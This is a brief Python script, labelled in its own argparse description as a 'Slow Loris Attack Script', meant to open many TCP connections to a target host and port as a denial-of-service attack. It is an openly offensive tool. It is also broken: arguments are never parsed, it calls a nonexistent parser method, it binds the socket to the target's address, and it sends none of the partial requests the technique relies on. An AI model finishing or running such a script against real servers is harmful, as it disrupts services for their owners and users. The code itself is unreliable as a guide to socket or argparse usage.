import socket
import sys
import argparse

#arg parse stuff
parser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")

parser.add_argument("domain", help="host")
parser.add_argument("-p", "--port", type=int, default=88, help="port")

#if its 1 or less then poop pants
if len(parser._get_args()) <= 1:
    parser.print_help()
    sys.exit(1)

#if no domain then poop pants
if not parser.domain:
    print("need to site")
    parser.print_help()
    sys.exit(1)


#init and send for each socket
def sockInit():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind((parser.domain, parser.port))
        sock.connect(parser.domain)
    

def main():
    sockNum = 12
    for _ in range(sockNum):
        sockInit()

main()

